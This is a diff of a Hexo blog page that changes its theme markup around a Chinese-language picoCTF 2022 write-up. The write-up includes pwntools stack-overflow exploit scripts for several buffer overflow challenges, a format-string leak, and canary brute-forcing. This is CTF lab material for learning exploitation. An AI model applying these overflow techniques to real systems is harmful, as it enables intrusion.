@@ -1,387 +1,213 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
   <meta charset="UTF-8">
-  <meta 
-    name="viewport"
-    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-  <meta 
-    http-equiv="X-UA-Compatible" 
-    content="ie=edge">
-  <meta 
-    name="theme-color" 
-    content="#fff" 
-    id="theme-color">
-  <meta 
-    name="description" 
-    content="Hexo">
-  <link 
-    rel="icon" 
-    href="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
-  <title>picoCTF_wp</title>
-  
-    
-      <meta 
-        property="og:title" 
-        content="picoCTF_wp">
-    
-    
-      <meta 
-        property="og:url" 
-        content="http://example.com/2022/03/18/picoCTF-wp/index.html">
-    
-    
-      <meta 
-        property="og:img" 
-        content="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
-    
-    
-    
-      <meta 
-        property="og:type" 
-        content="article">
-      <meta 
-        property="og:article:published_time" 
-        content="2022-03-18">
-      <meta 
-        property="og:article:modified_time" 
-        content="2022-03-31">
-      <meta 
-        property="og:article:author" 
-        content="幽林">
-      
-        
-      
-    
-  
-  
-  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
-  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
-  <link rel="preload" href="/css/main.css" as="style" >
-  
-  <link rel="modulepreload" href="//instant.page/5.1.0">
-  
-  <link rel="stylesheet" href="/css/main.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
-  
-  
-  
-    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
-  
-  <script>
-    function loadScript(url, cb) {
-      var script = document.createElement('script');
-      script.src = url;
-      if (cb) script.onload = cb;
-      script.async = true;
-      document.body.appendChild(script);
-    }
-    function loadCSS(href, data, attr) {
-      var sheet = document.createElement('link');
-      sheet.ref = 'stylesheet';
-      sheet.href = href;
-      sheet.dataset[data] = attr;
-      document.head.appendChild(sheet);
-    }
-    function changeCSS(cssFile, data, attr) {
-      var oldlink = document.querySelector(data);
-      var newlink = document.createElement("link");
-      newlink.setAttribute("rel", "stylesheet");
-      newlink.setAttribute("href", cssFile);
-      newlink.dataset.prism = attr;
-      document.head.replaceChild(newlink, oldlink);
-    }
-  </script>
-  
-    
-  
-  <script>
-    // control reverse button
-    var reverseDarkList = {
-      dark: 'light',
-      light: 'dark'
-    };
-    var themeColor = {
-      dark: '#1c1c1e',
-      light: '#fff'
-    }
-    // get the data of css prefers-color-scheme
-    var getCssMediaQuery = function() {
-      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-    };
-    // reverse current darkmode setting function
-    var reverseDarkModeSetting = function() {
-      var setting = localStorage.getItem('user-color-scheme');
-      if(reverseDarkList[setting]) {
-        setting = reverseDarkList[setting];
-      } else if(setting === null) {
-        setting = reverseDarkList[getCssMediaQuery()];
-      } else {
-        return;
-      }
-      localStorage.setItem('user-color-scheme', setting);
-      return setting;
-    };
-    // apply current darkmode setting
-  </script>
-  
-    <script>
-      var setDarkmode = function(mode) {
-      var setting = mode || localStorage.getItem('user-color-scheme');
-      if(setting === getCssMediaQuery()) {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-      } else if(reverseDarkList[setting]) {
-        document.documentElement.setAttribute('data-user-color-scheme', setting);
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-      } else {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
-        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
-      }
-    };
-    setDarkmode();
-    </script>
-  
-  
-  
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
-  
-  
-    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
-  
-  
-  
-  
-  
-  
-<meta name="generator" content="Hexo 6.0.0"></head>
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
 
-  <body>
-    <div class="wrapper">
-       
-      <nav class="navbar">
-  <div class="navbar-logo">
-    <a class="navbar-logo-main" href="/">
-      
-        <img 
-          class="navbar-logo-img"
-          width="32"
-          height="32"
-          src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
-          alt="blog logo">
-      
-      <span class="navbar-logo-dsc">幽林</span>
-      </a>
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="basic-file-exploit根据题目的提示可以知道寻找题目的逻辑漏洞在nc链接后输入两个1后进入2，此时随便输入几个字符串就可以进入到打印flag的函数 buffer overflow 0一道简单的栈溢出题《ret2text》exp：from pwn import *io&#x3D;process(“.&#x2F;vuln1”)io&#x3D;remote(“saturn.picoctf.net”,64712)payl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoCTF_wp">
+<meta property="og:url" content="http://wscyoulin.github.io/2022/03/18/picoCTF-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="basic-file-exploit根据题目的提示可以知道寻找题目的逻辑漏洞在nc链接后输入两个1后进入2，此时随便输入几个字符串就可以进入到打印flag的函数 buffer overflow 0一道简单的栈溢出题《ret2text》exp：from pwn import *io&#x3D;process(“.&#x2F;vuln1”)io&#x3D;remote(“saturn.picoctf.net”,64712)payl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.bmp.ovh/imgs/2022/03/31/e819ad73b747ec52.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2022/03/31/f873cbec721194f5.png">
+<meta property="article:published_time" content="2022-03-18T12:26:42.000Z">
+<meta property="article:modified_time" content="2022-03-31T14:55:24.838Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.bmp.ovh/imgs/2022/03/31/e819ad73b747ec52.png">
+
+
+<link rel="canonical" href="http://wscyoulin.github.io/2022/03/18/picoCTF-wp/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://wscyoulin.github.io/2022/03/18/picoCTF-wp/","path":"2022/03/18/picoCTF-wp/","title":"picoCTF_wp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>picoCTF_wp | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
   </div>
-  <div class="navbar-menu">
-    
-      <a 
-        href="/" 
-        class="navbar-menu-item">
-        
-          Home
-        
-      </a>
-    
-      <a 
-        href="/archives" 
-        class="navbar-menu-item">
-        
-          Archive
-        
-      </a>
-    
-      <a 
-        href="/tags" 
-        class="navbar-menu-item">
-        
-          Tags
-        
-      </a>
-    
-      <a 
-        href="/categories" 
-        class="navbar-menu-item">
-        
-          Categories
-        
-      </a>
-    
-      <a 
-        href="/about" 
-        class="navbar-menu-item">
-        
-          About
-        
-      </a>
-    
-      <a 
-        href="/links" 
-        class="navbar-menu-item">
-        
-          Friends
-        
-      </a>
-    
-    <button 
-      class="navbar-menu-item darknavbar navbar-menu-btn" 
-      aria-label="Toggle dark mode"
-      id="dark">
-      <i class="iconfont icon-weather"></i>
-    </button>
-    <button 
-      class="navbar-menu-item searchnavbar navbar-menu-btn" 
-      aria-label="Toggle search"
-      id="search">
-      <!-- <i 
-        class="iconfont icon-search" 
-        style="font-size: 1.2rem; font-weight: 400;">
-      </i> -->
-      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img"
-        class="iconify iconify--ion" width="28" height="28" preserveAspectRatio="xMidYMid meet" viewBox="0 0 512 512">
-        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
-          d="M256 80a176 176 0 1 0 176 176A176 176 0 0 0 256 80Z"></path>
-        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
-          d="M232 160a72 72 0 1 0 72 72a72 72 0 0 0-72-72Z"></path>
-        <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="28"
-          d="M283.64 283.64L336 336"></path>
-      </svg>
-    </button>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
   </div>
-</nav> 
-      
-      <div 
-        id="local-search" 
-        style="display: none">
-        <input
-          class="navbar-menu-item"
-          id="search-input"
-          placeholder="请输入搜索内容..." />
-        <div id="search-content"></div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#basic-file-exploit"><span class="nav-number">1.</span> <span class="nav-text">basic-file-exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buffer-overflow-0"><span class="nav-number">2.</span> <span class="nav-text">buffer overflow 0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E3%80%8Aret2text%E3%80%8B"><span class="nav-number">2.1.</span> <span class="nav-text">一道简单的栈溢出题《ret2text》</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-XXXX-XXXX"><span class="nav-number">3.</span> <span class="nav-text">CVE-XXXX-XXXX</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buffer-overflow-1"><span class="nav-number">4.</span> <span class="nav-text">buffer overflow 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RPS"><span class="nav-number">5.</span> <span class="nav-text">RPS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x-sixty-what"><span class="nav-number">6.</span> <span class="nav-text">x-sixty-what</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%8464%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE"><span class="nav-number">6.1.</span> <span class="nav-text">一道简单的64位栈溢出题目</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#buffer-overflow-2"><span class="nav-number">7.</span> <span class="nav-text">buffer overflow 2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E9%A2%98%E8%80%83%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%EF%BC%8C32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BB%8E%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%8E%E4%B8%A4%E4%B8%AA0x8%E5%BC%80%E5%A7%8B%EF%BC%88%E9%9C%80%E8%A6%81%E4%BC%A0%E9%80%9216%E8%BF%9B%E5%88%B6%E7%9A%84%E6%95%B0%EF%BC%89"><span class="nav-number">7.1.</span> <span class="nav-text">本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag-leak"><span class="nav-number">8.</span> <span class="nav-text">flag leak</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#canary"><span class="nav-number">9.</span> <span class="nav-text">canary</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#file-run1"><span class="nav-number">10.</span> <span class="nav-text">file-run1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#file-run2"><span class="nav-number">11.</span> <span class="nav-text">file-run2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#patchme-py"><span class="nav-number">12.</span> <span class="nav-text">patchme.py</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">12.1.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E5%BE%97%E5%88%86"><span class="nav-number">13.</span> <span class="nav-text">最后得分</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
       </div>
-      
-      <div class="section-wrap">
-        <div class="container">
-          <div class="columns">
-            <aside class="left-column">
-              
-              <div class="card card-author">
-                
-  <img 
-    src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
-    class="author-img"
-    width="88"
-    height="88"
-    alt="author avatar">
-
-<p class="author-name">幽林</p>
-<p class="author-description">太菜了，只能输出点垃圾</p>
-<div class="author-message">
-  <a 
-    class="author-posts-count" 
-    href="/archives">
-    <span>18</span>
-    <span>Posts</span>
-  </a>
-  <a 
-    class="author-categories-count" 
-    href="/categories">
-    <span>0</span>
-    <span>Categories</span>
-  </a>
-  <a 
-    class="author-tags-count" 
-    href="/tags">
-    <span>0</span>
-    <span>Tags</span>
-  </a>
+  </nav>
 </div>
 
-              </div>
-               <div class="sticky-tablet">
-  
-  
-    <article class="display-when-two-columns spacer">
-      <div class="card card-content toc-card">
-        <div class="toc-header">
-  <i 
-    class="iconfont icon-menu" 
-    style="padding-right: 2px;">
-  </i>TOC
-</div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#basic-file-exploit"><span class="toc-text">basic-file-exploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-0"><span class="toc-text">buffer overflow 0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E3%80%8Aret2text%E3%80%8B"><span class="toc-text">一道简单的栈溢出题《ret2text》</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-XXXX-XXXX"><span class="toc-text">CVE-XXXX-XXXX</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-1"><span class="toc-text">buffer overflow 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RPS"><span class="toc-text">RPS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x-sixty-what"><span class="toc-text">x-sixty-what</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%8464%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE"><span class="toc-text">一道简单的64位栈溢出题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#buffer-overflow-2"><span class="toc-text">buffer overflow 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98%E8%80%83%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%EF%BC%8C32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E4%BB%8E%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%8E%E4%B8%A4%E4%B8%AA0x8%E5%BC%80%E5%A7%8B%EF%BC%88%E9%9C%80%E8%A6%81%E4%BC%A0%E9%80%9216%E8%BF%9B%E5%88%B6%E7%9A%84%E6%95%B0%EF%BC%89"><span class="toc-text">本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flag-leak"><span class="toc-text">flag leak</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#canary"><span class="toc-text">canary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-run1"><span class="toc-text">file-run1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-run2"><span class="toc-text">file-run2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#patchme-py"><span class="toc-text">patchme.py</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E5%BE%97%E5%88%86"><span class="toc-text">最后得分</span></a></li></ol>
+
+
+        </div>
       </div>
-    </article>
-  
-  
-  <article class="card card-content categories-widget">
-    <div class="categories-card">
-  <div class="categories-header">
-    <i 
-      class="iconfont icon-fenlei" 
-      style="padding-right: 2px;">
-    </i>Categories
-  </div>
-  <div class="categories-list">
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
     
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
   </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/03/18/picoCTF-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          picoCTF_wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-03-18 20:26:42" itemprop="dateCreated datePublished" datetime="2022-03-18T20:26:42+08:00">2022-03-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-31 22:55:24" itemprop="dateModified" datetime="2022-03-31T22:55:24+08:00">2022-03-31</time>
+    </span>
+
+  
 </div>
-  </article>
-  
-  <article class="card card-content tags-widget">
-    <div class="tags-card">
-  <div class="tags-header">
-    <i 
-      class="iconfont icon-biaoqian" 
-      style="padding-right: 2px;">
-    </i>hot tags
-  </div>
-  <div class="tags-list">
-    
-  </div>
-</div>
-  </article>
-  
-  
-</div>
-            </aside>
-            <main class="main-column">
-              
-<article class="card card-content">
-  <header>
-    <h1 class="post-title">
-      picoCTF_wp
-    </h1>
-  </header>
-  <div class="post-meta post-show-meta">
-    <time datetime="2022-03-18T12:26:42.000Z">
-      <i 
-        class="iconfont icon-calendar" 
-        style="margin-right: 2px;">
-      </i>
-      <span>2022-03-18</span>
-    </time>
+
+        </div>
+      </header>
+
     
     
-      <span class="dot"></span>
-      <span>653 words</span>
     
-  </div>
-  
-  </header>
-  <div 
-    id="section" 
-    class="post-content">
-    <h1 id="basic-file-exploit"><a href="#basic-file-exploit" class="headerlink" title="basic-file-exploit"></a>basic-file-exploit</h1><p>根据题目的提示可以知道寻找题目的逻辑漏洞在nc链接后输入两个1后进入2，此时随便输入几个字符串就可以进入到打印flag的函数</p>
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="basic-file-exploit"><a href="#basic-file-exploit" class="headerlink" title="basic-file-exploit"></a>basic-file-exploit</h1><p>根据题目的提示可以知道寻找题目的逻辑漏洞在nc链接后输入两个1后进入2，此时随便输入几个字符串就可以进入到打印flag的函数</p>
 <h1 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h1><h2 id="一道简单的栈溢出题《ret2text》"><a href="#一道简单的栈溢出题《ret2text》" class="headerlink" title="一道简单的栈溢出题《ret2text》"></a>一道简单的栈溢出题《ret2text》</h2><p>exp：<br>from pwn import *<br>io=process(“./vuln1”)<br>io=remote(“saturn.picoctf.net”,64712)<br>payload = b’A’*0x74 + b’A’*4 + p64(0x200A)##这道题因为开了地址随机化所以需要直接把返回地址放在flag的txt段<br>io.sendline(payload)<br>t=io.recv()<br>print(t)  </p>
 <h1 id="CVE-XXXX-XXXX"><a href="#CVE-XXXX-XXXX" class="headerlink" title="CVE-XXXX-XXXX"></a>CVE-XXXX-XXXX</h1><p>直接百度搜索漏洞：picoCTF{CVE-2021-34527}</p>
 <h1 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h1><p>from pwn import *<br>#io=process(“./vuln1”)<br>io=remote(“saturn.picoctf.net”,53672)<br>io.recv()<br>payload1=b’A’*44 + p32(0x80491f6)<br>io.sendline(payload1)<br>io.recvline()<br>t=io.recv()<br>print(t)  </p>
@@ -389,291 +215,80 @@
 <h1 id="x-sixty-what"><a href="#x-sixty-what" class="headerlink" title="x-sixty-what"></a>x-sixty-what</h1><h2 id="一道简单的64位栈溢出题目"><a href="#一道简单的64位栈溢出题目" class="headerlink" title="一道简单的64位栈溢出题目"></a>一道简单的64位栈溢出题目</h2><p>from pwn import *<br>io=process(“./vuln2”)<br>io=remote(“saturn.picoctf.net”,63732)<br>elf=ELF(“./vuln2”)<br>ret=0x000000000040101a<br>flag=elf.symbols[‘flag’]<br>main_addr=elf.symbols[‘main’]<br>print(hex(flag))<br>io.recv()<br>payload=0x40<em>b’A’+0x8</em>b’A’+p64(ret)+p64(flag) ##可能需要加个ret函数去对齐<br>io.sendline(payload)<br>t=io.recv()<br>print(t)  </p>
 <h1 id="buffer-overflow-2"><a href="#buffer-overflow-2" class="headerlink" title="buffer overflow 2"></a>buffer overflow 2</h1><h2 id="本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）"><a href="#本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）" class="headerlink" title="本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）"></a>本题考的是函数的参数传递，32位系统的函数的参数从地址的后两个0x8开始（需要传递16进制的数）</h2><p>from pwn import *<br>#io=gdb.debug(“./vuln3”)<br>io=process(“./vuln3”)<br>#io=remote(“saturn.picoctf.net”,51392)<br>elf=ELF(“./vuln3”)<br>win_addr=elf.symbols[‘win’]<br>main_addr=elf.symbols[‘main’]<br>payload=0x6c*b’A’+b’A’*4+p32(win_addr)+p32(win_addr)+p32(0xCAFEF00D)+p32(0xF00DF00D)<br>io.sendline(payload)<br>#p=io.recv()<br>#print(p)<br>io.interactive()  </p>
 <h1 id="flag-leak"><a href="#flag-leak" class="headerlink" title="flag leak"></a>flag leak</h1><p>一道格式化字符串题目，由于掌握的不熟练所以是用枚举法一个一个试出来的，最终是%25$s将位于栈上的flag打印了出来</p>
-<h1 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h1><p>这题与正常的栈溢出题目不同，是将canary.txt存在了栈中的某个位置，需要利用python脚本去爆破在栈中的这4位数字<br><img src="https://i.bmp.ovh/imgs/2022/03/31/e819ad73b747ec52.png" alt="exp" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://i.bmp.ovh/imgs/2022/03/31/e819ad73b747ec52.png" class="lozad post-image"></p>
+<h1 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h1><p>这题与正常的栈溢出题目不同，是将canary.txt存在了栈中的某个位置，需要利用python脚本去爆破在栈中的这4位数字<br><img src="https://i.bmp.ovh/imgs/2022/03/31/e819ad73b747ec52.png" alt="exp"></p>
 <h1 id="file-run1"><a href="#file-run1" class="headerlink" title="file-run1"></a>file-run1</h1><p>将题目放在linux里面运行一下就出了flag</p>
 <h1 id="file-run2"><a href="#file-run2" class="headerlink" title="file-run2"></a>file-run2</h1><p>将题目放进ida当中可以直接查看flag</p>
 <h1 id="patchme-py"><a href="#patchme-py" class="headerlink" title="patchme.py"></a>patchme.py</h1><p>题目给了一道程序和一个python文件，根据分析python分析python文件可以知道将里面的一个列表按照一定的顺序打印出来并输入进程序就可以出flag</p>
 <h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>a = “!&quot;#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ”+ <br>            “[\]^_`abcdefghijklmnopqrstuvwxyz{|}~ “<br>print(a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68])</p>
-<h1 id="最后得分"><a href="#最后得分" class="headerlink" title="最后得分"></a>最后得分</h1><p><img src="https://s3.bmp.ovh/imgs/2022/03/31/f873cbec721194f5.png" alt="最后得分" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="https://s3.bmp.ovh/imgs/2022/03/31/f873cbec721194f5.png" class="lozad post-image"></p>
+<h1 id="最后得分"><a href="#最后得分" class="headerlink" title="最后得分"></a>最后得分</h1><p><img src="https://s3.bmp.ovh/imgs/2022/03/31/f873cbec721194f5.png" alt="最后得分"></p>
 
-  </div>
-  <div>
-    
-      <div 
-        class="post-note note-warning copyright" 
-        style="margin-top: 42px">
-        <p>
-          <span style="font-weight: bold;">作者：</span><a 
-            target="_blank" 
-            rel="nofollow noopener noreferrer" 
-            href="/about">
-            幽林
-          </a>
-        </p>
-        <p>
-          <span style="font-weight: bold;">文章链接：</span><a 
-            target="_blank" 
-            rel="nofollow noopener noreferrer" 
-            href="http://example.com/2022/03/18/picoCTF-wp/">
-            http://example.com/2022/03/18/picoCTF-wp/
-          </a>
-        </p>
